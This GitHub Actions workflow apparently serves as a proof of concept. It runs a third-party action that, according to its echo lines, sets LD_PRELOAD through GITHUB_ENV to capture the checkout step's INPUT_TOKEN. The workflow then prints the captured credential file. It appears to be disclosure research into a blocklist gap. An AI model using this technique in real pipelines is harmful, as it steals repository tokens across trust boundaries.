name: BASH_ENV Injection Test
on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  cross-boundary-test:
    runs-on: ubuntu-latest
    steps:
      - name: Step 1 — Use third-party action (toofikz2)
        uses: toofikz2/public-test-repo@main

      - name: Step 2 — Standard checkout (trust boundary crossing)
        uses: actions/checkout@v4

      - name: Step 3 — Check if cross-boundary capture succeeded
        run: |
          echo "=== CROSS-BOUNDARY LD_PRELOAD TEST ==="
          echo "This workflow uses toofikz2/public-test-repo@main (a third-party action)"
          echo "which sets LD_PRELOAD via GITHUB_ENV. The .so captures INPUT_TOKEN"
          echo "from actions/checkout's process environment."
          echo ""
          echo "LD_PRELOAD value: $LD_PRELOAD"
          echo ""
          if [ -f /tmp/crossboundary_capture.txt ]; then
            echo "CROSS-BOUNDARY CAPTURE SUCCEEDED:"
            cat /tmp/crossboundary_capture.txt
            echo ""
            echo "FINDING: Third-party action (toofikz2) captured tokens from"
            echo "checkout step running in workflow owner's (toofikz4) context."
            echo "This proves the GITHUB_ENV blocklist gap enables cross-trust-boundary"
            echo "credential capture via LD_PRELOAD."
          else
            echo "No capture file found"
          fi
